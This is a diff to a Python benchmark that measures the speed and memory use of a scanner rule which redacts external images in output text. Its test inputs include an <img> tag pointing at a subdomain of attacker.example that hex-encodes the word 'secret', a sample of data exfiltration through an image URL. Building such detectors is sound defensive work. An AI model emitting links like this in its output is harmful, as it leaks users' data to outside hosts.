@@ -45,9 +45,9 @@ def benchmark(
     engine = RuleEngine(
         scanner=RuleScanner(rules=(ExternalResourceRule(config),))
     )
-    query = "![x](https://outside.example/pixel.png?payload=synthetic)"
-    opaque = (
-        '<img src="https://outside.example/' + "Ab01" * 16 + '">'
+    external = "![x](https://outside.example/pixel.png)"
+    hostname_encoded = (
+        '<img src="https://736563726574.attacker.example/a.png">'
     )
     allowed = "![x](https://cdn.assets.example/pixel.png?cache=one)"
     workloads = (
@@ -62,8 +62,12 @@ def benchmark(
             _exact("![label] ordinary text\n", size),
             Action.ALLOW,
         ),
-        ("query_at_end", _exact("x", size, suffix=query), Action.REDACT),
-        ("opaque_at_end", _exact("x", size, suffix=opaque), Action.REDACT),
+        ("external_at_end", _exact("x", size, suffix=external), Action.REDACT),
+        (
+            "hostname_encoded_at_end",
+            _exact("x", size, suffix=hostname_encoded),
+            Action.REDACT,
+        ),
         ("allowed_at_end", _exact("x", size, suffix=allowed), Action.ALLOW),
     )
     durations: dict[str, list[float]] = {
@@ -84,11 +88,11 @@ def benchmark(
                     f"{result.decision.value}"
                 )
 
-    query_text = next(
-        text for name, text, _ in workloads if name == "query_at_end"
+    external_text = next(
+        text for name, text, _ in workloads if name == "external_at_end"
     )
     tracemalloc.start()
-    measured = engine.process(query_text, scope=ScanScope.OUTPUT)
+    measured = engine.process(external_text, scope=ScanScope.OUTPUT)
     _, peak_bytes = tracemalloc.get_traced_memory()
     tracemalloc.stop()
     if measured.decision is not Action.REDACT:
@@ -104,7 +108,7 @@ def benchmark(
     with pool:
         if (
             pool.process(
-                query_text,
+                external_text,
                 scope=ScanScope.OUTPUT,
                 timeout=120,
             ).decision
@@ -116,7 +120,7 @@ def benchmark(
             results = tuple(
                 callers.map(
                     lambda _: pool.process(
-                        query_text,
+                        external_text,
                         scope=ScanScope.OUTPUT,
                         timeout=120,
                     ),
@@ -133,7 +137,7 @@ def benchmark(
             f"{name}_mib_per_second": mib / statistics.median(values)
             for name, values in durations.items()
         },
-        "query_peak_mib": peak_bytes / (1024 * 1024),
+        "external_peak_mib": peak_bytes / (1024 * 1024),
         "process_requests_per_second": process_requests / process_seconds,
     }
 
@@ -165,7 +169,7 @@ def main() -> None:
     )
     if min(throughput) < args.min_throughput_mib_s:
         raise SystemExit("external-resource throughput gate failed")
-    if result["query_peak_mib"] > args.max_peak_mib:
+    if result["external_peak_mib"] > args.max_peak_mib:
         raise SystemExit("external-resource memory gate failed")
     if (
         result["process_requests_per_second"]
